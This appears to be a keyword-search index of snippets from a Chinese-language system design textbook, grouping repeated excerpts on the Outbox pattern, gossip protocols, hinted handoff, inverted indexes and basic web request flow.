  c15_b09.md: ...状态）；补偿逻辑复杂 | 必须在无共享事务下协调的多服务操作 Outbox 模式 | 无双写即可靠发布事件 | 额外的 outbox 表；消息中继进程；发布略有延迟 | 任何需要在数据库写之后可靠发布事件的服务 幂等键 | 安全的至少一次投递；防止重复...
  c15_b09.md: ...### 15.7 SocialSnap 高级版升级——完整实现  把所有内容合起来，SocialSnap 使用编排和 Outbox 模式的高级版升级 saga：  **第 1 步：** HTTP 处理器收到升级请求。它在数据库中创建一条状态为 `PE...
  c15_b09.md: ...一条状态为 `PENDING` 的 saga 记录，以及唯一 saga ID（`saga_7f3a9b2c`）。它还在 outbox 中写入 `saga.premium.upgrade.start` 事件并带上 saga ID。HTTP 处理器返回“您...
  c15_b09.md: ...带上 saga ID。HTTP 处理器返回“您的升级正在处理中——请稍后查看。”  **第 2 步：** 消息中继发布 outbox 事件。升级编排器收到事件并开始协调。  **第 3 步：** 编排器调用 Payment Service：“给用户 4...
  c15_b09.md: ..._charge` 是否处理过。没有。它扣款，把结果记录在 `processed_operations` 表，并向自己的 outbox 写入 `payment.charge.succeeded` 事件。它自己的消息中继发布该事件。  **第 5 步：**...
  c15_b09.md: ...aga_7f3a9b2c_upgrade`。”  **第 6 步：** User Service 更新用户，并向自己的 outbox 写入 `user.upgraded.to.premium` 事件。  **第 7 步：** 编排器收到 `user.u...
  c15_b09.md: ...2PC 的分布式多服务工作流 | 没有真正原子性（可见中间状态）；补偿逻辑复杂 | 必须在无共享事务下协调的多服务操作 Outbox 模式 | 无双写即可靠发布事件 | 额外的 outbox 表；消息中继进程；发布略有延迟 | 任何需要在数据库写之后可...
  c15_b09.md: ...状态）；补偿逻辑复杂 | 必须在无共享事务下协调的多服务操作 Outbox 模式 | 无双写即可靠发布事件 | 额外的 outbox 表；消息中继进程；发布略有延迟 | 任何需要在数据库写之后可靠发布事件的服务 幂等键 | 安全的至少一次投递；防止重复...
  c15_b11.md: ...事务范围也不包含数据库。要把它们合并成一个原子单元，需要分布式事务（昂贵，且队列可能不支持）或另一种设计模式——这正是 Outbox 模式提供的。...
  c15_b12.md: ...收到请求。在 API Gateway 数据库中插入 pending 的 `follow_request` 记录，并通过 Outbox 模式发布 `follow.requested` 事件，payload 为 `{follower_id: 42, fol...
  c15_b16.md: ...幂等性需求——设计操作使其多次执行安全。  幂等键让非幂等操作变得幂等：每次操作尝试的唯一标识符让服务器检测并去重重试。Outbox 模式解决双写问题，无需分布式事务即可可靠发布事件。  Saga 模式用补偿事务代替回滚，协调无需 2PC 的多服务工作...
  c15_b16.md: ...发送确认邮件”问题——本章开头的 Thread A 例子——现在完全可解：saga 配编排器、每次服务调用带幂等键、用 Outbox 模式可靠发布事件、用补偿事务（用户升级失败则退款）恢复失败。  第 16 章把视角拉大到全系统失败。本章构建的所有异步...
  c21_b09.md: ...者屏幕上但从未存储。如果持久化成功但投递失败（接收者离线），消息已存储，待接收者重连时投递。先持久化模式与第 15 章 Outbox Pattern 原则相同——先写数据库，再触发副作用。...

=== gossip (38 occurrences) ===
  c26_b04.md: ...节点 B 代替接受该写，并在元数据中记录它作为节点 A 的“hint”持有该值。  当节点 A 恢复时，节点 B 通过 gossip（稍后讨论）检测到 A 回来，并把 hinted 数据发送给它。A 收到 hinted 数据后变最新，B 丢弃其 hin...
  c26_b05.md: ...### 26.5 Gossip 协议——知道谁还活着  集群有 N 个节点时，每个节点需要知道所有其他节点的当前状态：哪些活着、它们的哈希环位置、它们...
  c26_b05.md: ...点都向其询问集群状态的单一节点）是单点故障——对高可用性（availability）存储不可接受。   #### 定义：Gossip Protocol  **Gossip protocol** 是一种分布式通信机制，节点定期与随机选择的 peer 交换...
  c26_b05.md: ...故障——对高可用性（availability）存储不可接受。   #### 定义：Gossip Protocol  **Gossip protocol** 是一种分布式通信机制，节点定期与随机选择的 peer 交换状态信息。每个节点：  1. 每 T...
  c26_b05.md: ...社交网络中传播一样，信息指数级传播：一轮后 2 个节点知道消息；两轮后 4 个；k 轮后 2^k。对 100 节点集群，gossip 约 log₂(100) ≈ 7 轮到达所有节点。T=1 秒时，完整传播约 7 秒。  plain 语言：gossip...
  c26_b05.md: ...，gossip 约 log₂(100) ≈ 7 轮到达所有节点。T=1 秒时，完整传播约 7 秒。  plain 语言：gossip 是节点在没有中央目录的情况下相互交谈的方式。每个节点随机告诉邻居它知道的事；邻居把知识与自己的合并。信息以指数速度传播...
  c26_b05.md: ...情况下相互交谈的方式。每个节点随机告诉邻居它知道的事；邻居把知识与自己的合并。信息以指数速度传播。   #### 通过 Gossip 维护集群成员  新节点加入集群时，它联系任意现有节点（启动时配置的“种子节点”）。种子通过 gossip 把新节点到来...
  c26_b05.md: ...### 通过 Gossip 维护集群成员  新节点加入集群时，它联系任意现有节点（启动时配置的“种子节点”）。种子通过 gossip 把新节点到来传播给集群。数秒内所有节点都知道新来者。新节点从 gossip 获得当前环配置，并开始接收其 keyspa...
  c26_b05.md: ...节点（启动时配置的“种子节点”）。种子通过 gossip 把新节点到来传播给集群。数秒内所有节点都知道新来者。新节点从 gossip 获得当前环配置，并开始接收其 keyspace 份额。  节点故障（停止响应）时，尝试与其 gossip 的 peer...
  c26_b05.md: ...者。新节点从 gossip 获得当前环配置，并开始接收其 keyspace 份额。  节点故障（停止响应）时，尝试与其 gossip 的 peer 最终会发现。若干次失败尝试后，peer 把该节点标记为“可疑”。若多个 peer 报告同一节点可疑，集群...
  c26_b05.md: ...节点标记为“可疑”。若多个 peer 报告同一节点可疑，集群标记它宕机并开始对其键做 hinted handoff。  Gossip 协议也传播 schema 变更、配置更新和环修改——任何需要最终一致地到达所有节点的集群级状态。  * * *...
  c26_b05.md: ...### 26.5 Gossip 协议——知道谁还活着  集群有 N 个节点时，每个节点需要知道所有其他节点的当前状态：哪些活着、它们的哈希环位置、它们...
  c26_b05.md: ...点都向其询问集群状态的单一节点）是单点故障——对高可用性（availability）存储不可接受。   #### 定义：Gossip Protocol  **Gossip protocol** 是一种分布式通信机制，节点定期与随机选择的 peer 交换...
  c26_b05.md: ...故障——对高可用性（availability）存储不可接受。   #### 定义：Gossip Protocol  **Gossip protocol** 是一种分布式通信机制，节点定期与随机选择的 peer 交换状态信息。每个节点：  1. 每 T...
  c26_b05.md: ...社交网络中传播一样，信息指数级传播：一轮后 2 个节点知道消息；两轮后 4 个；k 轮后 2^k。对 100 节点集群，gossip 约 log₂(100) ≈ 7 轮到达所有节点。T=1 秒时，完整传播约 7 秒。  plain 语言：gossip...
  c26_b05.md: ...，gossip 约 log₂(100) ≈ 7 轮到达所有节点。T=1 秒时，完整传播约 7 秒。  plain 语言：gossip 是节点在没有中央目录的情况下相互交谈的方式。每个节点随机告诉邻居它知道的事；邻居把知识与自己的合并。信息以指数速度传播...
  c26_b05.md: ...情况下相互交谈的方式。每个节点随机告诉邻居它知道的事；邻居把知识与自己的合并。信息以指数速度传播。   #### 通过 Gossip 维护集群成员  新节点加入集群时，它联系任意现有节点（启动时配置的“种子节点”）。种子通过 gossip 把新节点到来...
  c26_b05.md: ...### 通过 Gossip 维护集群成员  新节点加入集群时，它联系任意现有节点（启动时配置的“种子节点”）。种子通过 gossip 把新节点到来传播给集群。数秒内所有节点都知道新来者。新节点从 gossip 获得当前环配置，并开始接收其 keyspa...
  c26_b05.md: ...节点（启动时配置的“种子节点”）。种子通过 gossip 把新节点到来传播给集群。数秒内所有节点都知道新来者。新节点从 gossip 获得当前环配置，并开始接收其 keyspace 份额。  节点故障（停止响应）时，尝试与其 gossip 的 peer...
  c26_b05.md: ...者。新节点从 gossip 获得当前环配置，并开始接收其 keyspace 份额。  节点故障（停止响应）时，尝试与其 gossip 的 peer 最终会发现。若干次失败尝试后，peer 把该节点标记为“可疑”。若多个 peer 报告同一节点可疑，集群...
  c26_b05.md: ...节点标记为“可疑”。若多个 peer 报告同一节点可疑，集群标记它宕机并开始对其键做 hinted handoff。  Gossip 协议也传播 schema 变更、配置更新和环修改——任何需要最终一致地到达所有节点的集群级状态。  * * *...
  c26_b07.md: ...可用性问题 3. **Merkle tree anti-entropy：** 高效解决副本分歧检测问题 4. **基于 gossip 的成员管理：** 无中央协调器解决集群成员问题 5. **Vector clock 冲突解决：** 处理两个客户端同时...
  c26_b10.md: ...不可达；A（或 B）存储 hint：“节点 C 恢复时应接收该值。” 写成功并返回客户端。分区愈合后：B 或 A 通过 gossip 检测到 C 恢复，把 hinted 值发给 C，C 更新。读追踪：R=1 的读联系一个节点。可能结果：(1) 读路由到...
  c26_b10.md: ...：系统会收敛，但在收敛窗口期间读可能返回陈旧值。  **Q2.** 为 SocialSnap 200 节点键值集群设计 gossip 协议参数，使集群状态在 10 秒内全集群传播。每次 gossip 轮耗时 1 秒并到达一个随机 peer。需要多少轮？...
  c26_b10.md: ...为 SocialSnap 200 节点键值集群设计 gossip 协议参数，使集群状态在 10 秒内全集群传播。每次 gossip 轮耗时 1 秒并到达一个随机 peer。需要多少轮？若把协议改为每轮每个节点向 K 个 peer gossip，fan...
  c26_b10.md: ...。每次 gossip 轮耗时 1 秒并到达一个随机 peer。需要多少轮？若把协议改为每轮每个节点向 K 个 peer gossip，fanout 如何变化？  提示  把 gossip 传播建模为指数增长。fanout 为 1 时，k 轮后约 2^k...
  c26_b10.md: ...eer。需要多少轮？若把协议改为每轮每个节点向 K 个 peer gossip，fanout 如何变化？  提示  把 gossip 传播建模为指数增长。fanout 为 1 时，k 轮后约 2^k 个节点知道信息（k 相对集群较小时的粗略近似）。...
  c26_b11.md: ...) ≈ 7.6 → 8 轮 → 8 秒。在 10 秒预算内。fanout 为 K 时（每轮每个节点向 K 个 peer gossip）：第 1 轮后：1 + K 个节点知情。第 2 轮后：约 (1 + K)²（每个知情节点向 K 个新节点 gossip...
  c26_b11.md: ...gossip）：第 1 轮后：1 + K 个节点知情。第 2 轮后：约 (1 + K)²（每个知情节点向 K 个新节点 gossip）。一般：k 轮后约 K^k 个节点知情。K=3：3^k ≥ 200 → k ≥ log₃(200) ≈ 4.8 → 5...
  c26_b11.md: ...log₅(200) ≈ 3.3 → 4 轮 → 4 秒。fanout 更高传播更快，但网络流量更多（K=3 意味着每轮 gossip 消息是基线的 3 倍，K=5 则是 5 倍）。权衡：更高 fanout = 更快传播，但更多网络开销。对 200 节点...
  c26_b11.md: ...3 倍，K=5 则是 5 倍）。权衡：更高 fanout = 更快传播，但更多网络开销。对 200 节点集群、1 秒 gossip 间隔，fanout K=2（每轮 2 个 peer）可在 8 秒内传播——远低于 10 秒预算——而网络开销仅为基线的...
  c26_b11.md: ...200 → k ≥ log₂(200) ≈ 7.6 → 8 轮 → 8 秒。）SocialSnap 生产配置：K=2，gossip 间隔 1 秒，集群成员变更在 8 秒内全集群传播。  **Q3.** SocialSnap 键值集群 100 亿（10...
  c26_b13.md: ...后转发。  **Merkle tree** 使副本修复高效：O(log N) 次比较定位分歧，只传输分歧键范围。  **Gossip 协议** 无需中央协调器维护集群成员：信息指数级传播，O(log N) 轮 gossip 到达所有节点。  通过键值存...
  c26_b13.md: ...歧，只传输分歧键范围。  **Gossip 协议** 无需中央协调器维护集群成员：信息指数级传播，O(log N) 轮 gossip 到达所有节点。  通过键值存储看 SocialSnap 完整技术栈，显示成熟系统对不同数据类型使用不同一致性配置——这...
  c26_b13.md: ...后转发。  **Merkle tree** 使副本修复高效：O(log N) 次比较定位分歧，只传输分歧键范围。  **Gossip 协议** 无需中央协调器维护集群成员：信息指数级传播，O(log N) 轮 gossip 到达所有节点。  通过键值存...
  c26_b13.md: ...歧，只传输分歧键范围。  **Gossip 协议** 无需中央协调器维护集群成员：信息指数级传播，O(log N) 轮 gossip 到达所有节点。  通过键值存储看 SocialSnap 完整技术栈，显示成熟系统对不同数据类型使用不同一致性配置——这...
  c27_b11.md: ...制：配置服务中的单个功能开关控制流量路由。把开关从 “go” 改为 “python” 立即重定向所有流量。开关变更通过 gossip（第 26 章）在 10 秒内传播到所有路由节点。  **Q3.** 从 Tradeoff Matrix 视角审视 So...
  c28_b14.md: ...nti-entropy** (Ch 26) | 无查询延迟影响 | 最终（后台修复） | 高（自愈合副本） | 中 **Gossip protocol** (Ch 26) | 无延迟开销 | 最终（传播延迟） | 极高（无中央协调器 SPOF） | 低...

=== distributed (37 occurrences) ===
  c23_b01.md: ...衡应用于文本。文档加入搜索系统时，系统支付索引成本：读取文档、提取每个有意义的词，并记录哪些文档包含该词。然后用户搜索“distributed systems consistency（分布式系统 一致性）”时，搜索引擎不会扫描数十亿文档。它查三个词在预计算表中的...
  c23_b04.md: ...索。基本数据结构是倒排索引。让我们理解为什么。  假设有四份文档：  Doc ID | 内容 ---|--- 1 | "distributed systems（分布式系统） are hard" 2 | "systems design requires trade...
  c23_b04.md: ...式系统） are hard" 2 | "systems design requires tradeoffs" 3 | "distributed computing and consistency（一致性）" 4 | "design patterns for re...
  c23_b04.md: ...sistency（一致性）" 4 | "design patterns for reliability"  用户搜索 "distributed systems（分布式系统）"。朴素做法是扫描全部四份文档，找包含两个词的。4 份文档时这微不足道。100 亿（10...
  c23_b04.md: ...包含的词”，而是“词 → 包含它的文档”：  Word | Posting List（Doc IDs） ---|--- distributed | [1, 3] systems | [1, 2] design | [2, 4] hard | [1] consis...
  c23_b04.md: ...| [1] consistency | [3] tradeoffs | [2] reliability | [4]  "distributed systems" 的查询变成：取 "distributed" 的 posting list = [1, 3]，取 "s...
  c23_b04.md: ...ffs | [2] reliability | [4]  "distributed systems" 的查询变成：取 "distributed" 的 posting list = [1, 3]，取 "systems" 的 posting list = [1, 2...
  c23_b04.md: ...。典型 posting 包含：  * **Term frequency (TF)：** 该词在文档中出现多少次？提到 "distributed systems（分布式系统）" 50 次的文档可能比只提到一次的更相关。 * **Term position：** 词...
  c23_b05.md: ...pt、CSS。 2. **分词：** 把文本切分成单个 token（词）。 3. **归一化：** 转小写；去除标点。"Distributed," "distributed," 和 "DISTRIBUTED" 变成同一 token。 4. **停用词移除：**...
  c23_b05.md: ...：** 把文本切分成单个 token（词）。 3. **归一化：** 转小写；去除标点。"Distributed," "distributed," 和 "DISTRIBUTED" 变成同一 token。 4. **停用词移除：** 移除几乎每份文档都出现的极常见...
  c23_b05.md: ...n（词）。 3. **归一化：** 转小写；去除标点。"Distributed," "distributed," 和 "DISTRIBUTED" 变成同一 token。 4. **停用词移除：** 移除几乎每份文档都出现的极常见词，这些词对相关性贡献很小："th...
  c23_b05.md: ...** 把词还原为词根。"Running"、"ran"、"runs" 都可能变成 "run"。这让查询 "running distributed systems（分布式系统）" 能匹配包含 "run distributed system" 的文档。 6. **倒排...
  c23_b05.md: ..."run"。这让查询 "running distributed systems（分布式系统）" 能匹配包含 "run distributed system" 的文档。 6. **倒排索引更新：** 对每个剩余 token，把该文档的 ID、TF 和位置追加到...
  c23_b05.md: ...分片：** 每个分片按字母顺序拥有一段词。分片 1 拥有 A–G 的词；分片 2 拥有 H–P 的词；依此类推。查询 "distributed systems（分布式系统）" 必须命中两个分片（每个词一个），然后求交集。这叫 **term-based shard...
  c23_b05.md: ...rding**。  **按文档分片：** 每个分片拥有所有文档的一个子集，并为其文档子集维护完整的小型倒排索引。查询 "distributed systems" 并行命中所有分片；每个分片返回本地结果；结果合并。这叫 **document-based shard...
  c23_b05.md: ...pt、CSS。 2. **分词：** 把文本切分成单个 token（词）。 3. **归一化：** 转小写；去除标点。"Distributed," "distributed," 和 "DISTRIBUTED" 变成同一 token。 4. **停用词移除：**...
  c23_b05.md: ...：** 把文本切分成单个 token（词）。 3. **归一化：** 转小写；去除标点。"Distributed," "distributed," 和 "DISTRIBUTED" 变成同一 token。 4. **停用词移除：** 移除几乎每份文档都出现的极常见...
  c23_b05.md: ...n（词）。 3. **归一化：** 转小写；去除标点。"Distributed," "distributed," 和 "DISTRIBUTED" 变成同一 token。 4. **停用词移除：** 移除几乎每份文档都出现的极常见词，这些词对相关性贡献很小："th...
  c23_b05.md: ...** 把词还原为词根。"Running"、"ran"、"runs" 都可能变成 "run"。这让查询 "running distributed systems（分布式系统）" 能匹配包含 "run distributed system" 的文档。 6. **倒排...
  c23_b05.md: ..."run"。这让查询 "running distributed systems（分布式系统）" 能匹配包含 "run distributed system" 的文档。 6. **倒排索引更新：** 对每个剩余 token，把该文档的 ID、TF 和位置追加到...
  c23_b05.md: ...分片：** 每个分片按字母顺序拥有一段词。分片 1 拥有 A–G 的词；分片 2 拥有 H–P 的词；依此类推。查询 "distributed systems（分布式系统）" 必须命中两个分片（每个词一个），然后求交集。这叫 **term-based shard...
  c23_b05.md: ...rding**。  **按文档分片：** 每个分片拥有所有文档的一个子集，并为其文档子集维护完整的小型倒排索引。查询 "distributed systems" 并行命中所有分片；每个分片返回本地结果；结果合并。这叫 **document-based shard...
  c23_b05.md: ...pt、CSS。 2. **分词：** 把文本切分成单个 token（词）。 3. **归一化：** 转小写；去除标点。"Distributed," "distributed," 和 "DISTRIBUTED" 变成同一 token。 4. **停用词移除：**...
  c23_b05.md: ...：** 把文本切分成单个 token（词）。 3. **归一化：** 转小写；去除标点。"Distributed," "distributed," 和 "DISTRIBUTED" 变成同一 token。 4. **停用词移除：** 移除几乎每份文档都出现的极常见...
  c23_b05.md: ...n（词）。 3. **归一化：** 转小写；去除标点。"Distributed," "distributed," 和 "DISTRIBUTED" 变成同一 token。 4. **停用词移除：** 移除几乎每份文档都出现的极常见词，这些词对相关性贡献很小："th...
  c23_b05.md: ...** 把词还原为词根。"Running"、"ran"、"runs" 都可能变成 "run"。这让查询 "running distributed systems（分布式系统）" 能匹配包含 "run distributed system" 的文档。 6. **倒排...
  c23_b05.md: ..."run"。这让查询 "running distributed systems（分布式系统）" 能匹配包含 "run distributed system" 的文档。 6. **倒排索引更新：** 对每个剩余 token，把该文档的 ID、TF 和位置追加到...
  c23_b05.md: ...分片：** 每个分片按字母顺序拥有一段词。分片 1 拥有 A–G 的词；分片 2 拥有 H–P 的词；依此类推。查询 "distributed systems（分布式系统）" 必须命中两个分片（每个词一个），然后求交集。这叫 **term-based shard...
  c23_b05.md: ...rding**。  **按文档分片：** 每个分片拥有所有文档的一个子集，并为其文档子集维护完整的小型倒排索引。查询 "distributed systems" 并行命中所有分片；每个分片返回本地结果；结果合并。这叫 **document-based shard...
  c23_b06.md: ...#### TF-IDF：直觉  回到我们的例子。一份关于 "distributed systems（分布式系统）" 的文档如果提到该短语 50 次，可能非常聚焦该主题。但如果网上每份文档都提到 "sys...
  c23_b06.md: ...现在 1 份文档中的词 IDF = log(10,000,000,000) ≈ 23——找到它是强信号。  多词查询 "distributed consistency" 对某文档的总分是每个查询词的 TF-IDF 得分之和。   #### 常见误解  关于 TF...
  c23_b06.md: ...-IDF 的常见误解是更高的 TF 总意味着更好排名。但 TF 会被文档长度归一化。一份 10,000 词的文档提到 "distributed systems（分布式系统）" 50 次，实际上比一份 200 词提到 5 次的文档对该术语的密度更低。长度归一化防止...
  c23_b06.md: ...TF-IDF 根据内容衡量文档与查询的相关性。但它无法衡量文档是否可信或权威。垃圾页面可以炮制一份文档，每段都提到 "distributed systems（分布式系统）" 500 次，单凭 TF-IDF 会得极高分数。  Larry Page 和 Serge...
  c23_b07.md: ...* * *   ### 23.4 查询处理与 Typeahead  用户输入 "dist" 到搜索框，下拉框立即显示 "distributed systems（分布式系统）"、"distance learning"、"distillation"，这是 **typ...
  c23_b08.md: ...查询流水线  用户提交完整查询时，流水线如下：  1. **查询处理：** 应用索引时相同的分词、归一化和停用词移除。"Distributed Systems Consistency" 变成 ["distribut", "system", "consist"]（...
  c28_b11.md: ...(Ch 8) | 更高（异步） | 最终（消费者按自己节奏处理） | 极高——故障域解耦 | 中–高 **Kafka distributed log** (Ch 8) | 低（顺序磁盘写） | 分区内有序；跨消费者最终 | 极高——复制、持久化 | 高——Zo...
  c28_b13.md: ...ency keys** (Ch 16, 25) | 微小开销（键检查） | 强——精确一次语义 | N/A | 低 **Distributed tracing** (Ch 17) | 微小开销（trace 上下文传播） | N/A | N/A | 高——所有服务...

=== hinted (37 occurrences) ===
  c26_b03.md: ...是错误选择——计费使用关系型数据库（第 25 章的教训）而非键值存储。  * * *   ### 26.3 处理故障——Hinted Handoff 与 Sloppy Quorum  当写到达且协调节点的 preference list 包含暂时不可用...
  c26_b03.md: ...namo 方法（来自 Amazon 2007 年著名论文，本章设计基于它）：**sloppy quorum** 加 **hinted handoff**。...
  c26_b03.md: ...是错误选择——计费使用关系型数据库（第 25 章的教训）而非键值存储。  * * *   ### 26.3 处理故障——Hinted Handoff 与 Sloppy Quorum  当写到达且协调节点的 preference list 包含暂时不可用...
  c26_b03.md: ...namo 方法（来自 Amazon 2007 年著名论文，本章设计基于它）：**sloppy quorum** 加 **hinted handoff**。...
  c26_b04.md: ...点 A 的“hint”持有该值。  当节点 A 恢复时，节点 B 通过 gossip（稍后讨论）检测到 A 回来，并把 hinted 数据发送给它。A 收到 hinted 数据后变最新，B 丢弃其 hint。这就是 **hinted handoff**...
  c26_b04.md: ...节点 A 恢复时，节点 B 通过 gossip（稍后讨论）检测到 A 回来，并把 hinted 数据发送给它。A 收到 hinted 数据后变最新，B 丢弃其 hint。这就是 **hinted handoff**：B 为 A 临时保存数据，A 回来后...
  c26_b04.md: ...到 A 回来，并把 hinted 数据发送给它。A 收到 hinted 数据后变最新，B 丢弃其 hint。这就是 **hinted handoff**：B 为 A 临时保存数据，A 回来后再交还。  plain 语言：当某键的合法拥有者不可用时，邻居...
  c26_b04.md: ...erkle Tree 修复副本  故障和恢复后，副本可能分歧。节点 A 有 100 万键，离线 2 小时，期间收到邻居 hinted handoff 数据，但仍可能丢失离线期间写入且未被 hinted handoff 覆盖的键。  如何高效检测和修复两...
  c26_b04.md: ...A 有 100 万键，离线 2 小时，期间收到邻居 hinted handoff 数据，但仍可能丢失离线期间写入且未被 hinted handoff 覆盖的键。  如何高效检测和修复两个副本之间的分歧？  朴素方法：比较副本 A 和 B 的每个键值对。...
  c26_b04.md: ...若根不同，树比较将分歧缩小到具体键范围 4. 只传输并合并分歧键范围  这种持续的背景修复过程确保节点故障、网络分区或 hinted handoff 导致的临时分歧在有限时间内解决——**anti-entropy interval**，通常配置为数分钟...
  c26_b05.md: ...。若干次失败尝试后，peer 把该节点标记为“可疑”。若多个 peer 报告同一节点可疑，集群标记它宕机并开始对其键做 hinted handoff。  Gossip 协议也传播 schema 变更、配置更新和环修改——任何需要最终一致地到达所有节点的...
  c26_b06.md: ...受。写速度至关重要（写时扇出必须对 5000 万（50 million）用户快速完成）。Sloppy quorum 加 hinted handoff 保证节点故障期间的高写可用性——timeline 即使在部分故障时也必须可写。  **位置追踪**（拼...
  c26_b07.md: ...键创新：  1. **带虚拟节点的一致性哈希：** 解决数据分布与再平衡问题 2. **Sloppy quorum 与 hinted handoff：** 解决节点故障期间的写可用性问题 3. **Merkle tree anti-entropy：**...
  c26_b08.md: ...络请求。但保证看到最新写。用于搜索 posting 缓存和会话存储，因为陈旧有用户可见后果。  **Q3.** 什么是 hinted handoff，在什么条件下它保持数据可用性但不保持数据一致性？  **答案：** Hinted handoff：当某...
  c26_b08.md: ...*Q3.** 什么是 hinted handoff，在什么条件下它保持数据可用性但不保持数据一致性？  **答案：** Hinted handoff：当某键的标准节点 A 不可用时，邻近节点 B 临时存储本该给 A 的值，元数据中“hint”该值属于...
  c26_b08.md: ...的标准节点 A 不可用时，邻近节点 B 临时存储本该给 A 的值，元数据中“hint”该值属于 A。A 恢复后，B 把 hinted 数据转发给 A（handoff）并丢弃自己的副本。Hinted handoff 保持写可用性：即使某些标准节点宕机，写...
  c26_b08.md: ...，元数据中“hint”该值属于 A。A 恢复后，B 把 hinted 数据转发给 A（handoff）并丢弃自己的副本。Hinted handoff 保持写可用性：即使某些标准节点宕机，写仍成功到 W 个节点。系统报告写成功。但它不保持一致性：若 A...
  c26_b08.md: ...保持写可用性：即使某些标准节点宕机，写仍成功到 W 个节点。系统报告写成功。但它不保持一致性：若 A 宕机时读到达，且 hinted 数据尚未转发，读可能去 A（刚恢复但尚未更新）得到陈旧值，或去 B（作为 hint 持有最新值）得到正确值。结果取决于...
  c26_b08.md: ...B（作为 hint 持有最新值）得到正确值。结果取决于 R-quorum 联系哪些节点。不一致窗口从 A 恢复持续到 hinted handoff 完成——通常数秒到数分钟。  **Q4.** Merkle tree 如何实现高效的副本比较？为什么比...
  c26_b08.md: ...络请求。但保证看到最新写。用于搜索 posting 缓存和会话存储，因为陈旧有用户可见后果。  **Q3.** 什么是 hinted handoff，在什么条件下它保持数据可用性但不保持数据一致性？  **答案：** Hinted handoff：当某...
  c26_b08.md: ...*Q3.** 什么是 hinted handoff，在什么条件下它保持数据可用性但不保持数据一致性？  **答案：** Hinted handoff：当某键的标准节点 A 不可用时，邻近节点 B 临时存储本该给 A 的值，元数据中“hint”该值属于...
  c26_b08.md: ...的标准节点 A 不可用时，邻近节点 B 临时存储本该给 A 的值，元数据中“hint”该值属于 A。A 恢复后，B 把 hinted 数据转发给 A（handoff）并丢弃自己的副本。Hinted handoff 保持写可用性：即使某些标准节点宕机，写...
  c26_b08.md: ...，元数据中“hint”该值属于 A。A 恢复后，B 把 hinted 数据转发给 A（handoff）并丢弃自己的副本。Hinted handoff 保持写可用性：即使某些标准节点宕机，写仍成功到 W 个节点。系统报告写成功。但它不保持一致性：若 A...
  c26_b08.md: ...保持写可用性：即使某些标准节点宕机，写仍成功到 W 个节点。系统报告写成功。但它不保持一致性：若 A 宕机时读到达，且 hinted 数据尚未转发，读可能去 A（刚恢复但尚未更新）得到陈旧值，或去 B（作为 hint 持有最新值）得到正确值。结果取决于...
  c26_b08.md: ...B（作为 hint 持有最新值）得到正确值。结果取决于 R-quorum 联系哪些节点。不一致窗口从 A 恢复持续到 hinted handoff 完成——通常数秒到数分钟。  **Q4.** Merkle tree 如何实现高效的副本比较？为什么比...
  c26_b10.md: ...)`。写协调器是节点 A，preference list 是 [A, B, C]。追踪 sloppy quorum 加 hinted handoff 下该写的去向。然后追踪后续读 `GET("user:101:timeline")` 在 R=1 下的去...
  c26_b10.md: ...“节点 C 恢复时应接收该值。” 写成功并返回客户端。分区愈合后：B 或 A 通过 gossip 检测到 C 恢复，把 hinted 值发给 C，C 更新。读追踪：R=1 的读联系一个节点。可能结果：(1) 读路由到节点 A 或 B：返回 `new_v...
  c26_b10.md: ...1 的读联系一个节点。可能结果：(1) 读路由到节点 A 或 B：返回 `new_value`——最新写。(2) 读在 hinted handoff 完成前路由到节点 C：C 仍有旧值。返回 `old_value`——陈旧，但系统不知道是陈旧的。(3)...
  c26_b10.md: ...doff 完成前路由到节点 C：C 仍有旧值。返回 `old_value`——陈旧，但系统不知道是陈旧的。(3) 读在 hinted handoff 后路由到节点 C：返回 `new_value`。决定结果的因素：负载均衡器的节点选择、分区恢复时机、h...
  c26_b10.md: ...d handoff 后路由到节点 C：返回 `new_value`。决定结果的因素：负载均衡器的节点选择、分区恢复时机、hinted handoff 传播速度。这就是最终一致性的本质：系统会收敛，但在收敛窗口期间读可能返回陈旧值。  **Q2.** 为...
  c26_b13.md: ...展原则（第 11 章）适用：任何节点可处理任何请求，使系统无状态且可扩展。Reliability（第 16–19 章）：Hinted handoff 是可靠性机制——类似第 16 章优雅降级模式。节点故障时系统优雅降级：通过 sloppy quorum...
  c26_b13.md: ...lSnap 对不同数据类型使用不同 N/W/R 配置，反映它们不同的一致性需求。  **Sloppy quorum 加 hinted handoff** 优先写可用性：写总是成功到 W 个可用节点，hinted 数据在标准节点恢复后转发。  **Mer...
  c26_b13.md: ...。  **Sloppy quorum 加 hinted handoff** 优先写可用性：写总是成功到 W 个可用节点，hinted 数据在标准节点恢复后转发。  **Merkle tree** 使副本修复高效：O(log N) 次比较定位分歧，只传输...
  c26_b13.md: ...展原则（第 11 章）适用：任何节点可处理任何请求，使系统无状态且可扩展。Reliability（第 16–19 章）：Hinted handoff 是可靠性机制——类似第 16 章优雅降级模式。节点故障时系统优雅降级：通过 sloppy quorum...
  c26_b13.md: ...lSnap 对不同数据类型使用不同 N/W/R 配置，反映它们不同的一致性需求。  **Sloppy quorum 加 hinted handoff** 优先写可用性：写总是成功到 W 个可用节点，hinted 数据在标准节点恢复后转发。  **Mer...
  c26_b13.md: ...。  **Sloppy quorum 加 hinted handoff** 优先写可用性：写总是成功到 W 个可用节点，hinted 数据在标准节点恢复后转发。  **Merkle tree** 使副本修复高效：O(log N) 次比较定位分歧，只传输...
  c28_b14.md: ...Ch 25) | 极低（前缀键查找） | 最终（空间索引异步更新） | 高 | 低 **Sloppy quorum + hinted handoff** (Ch 26) | 低（写到任意 W 节点） | 最终（标准节点可能未最新） | 极高（写总是成功...

=== web (36 occurrences) ===
  c01_b01.md: ...有明确的边界定义什么可以进来、什么必须出去。  上面的函数本身不是系统。但把它和数据库、一个负责路由 HTTP 请求的 Web 服务器、一台把流量分发到多台机器的负载均衡器、一个让重复读取更快的缓存，以及一个出故障时报警的监控服务组合起来——现在...
  c01_b02.md: ...浏览器向 203.0.113.7 发送 HTTP 请求：“给我第 42 号文章。” 4. 203.0.113.7 上的 Web 服务器收到请求，调用你的 `get_post(42)` 函数。 5. 函数向数据库查询第 42 号文章。 6. 数据库...
  c01_b02.md: ...你的 `get_post(42)` 函数。 5. 函数向数据库查询第 42 号文章。 6. 数据库返回文章数据。 7. Web 服务器把它格式化成 HTML 并发送回去。 8. 浏览器渲染 HTML。  你的朋友看到了一篇博客文章。但背后有八个不...
  c01_b02.md: ...浏览器渲染 HTML。  你的朋友看到了一篇博客文章。但背后有八个不同的系统参与了——浏览器、DNS 基础设施、网络、Web 服务器、应用代码、数据库、HTTP 协议，以及 HTML 渲染引擎。其中大多数不受你控制。但你要对中间那部分负责。...
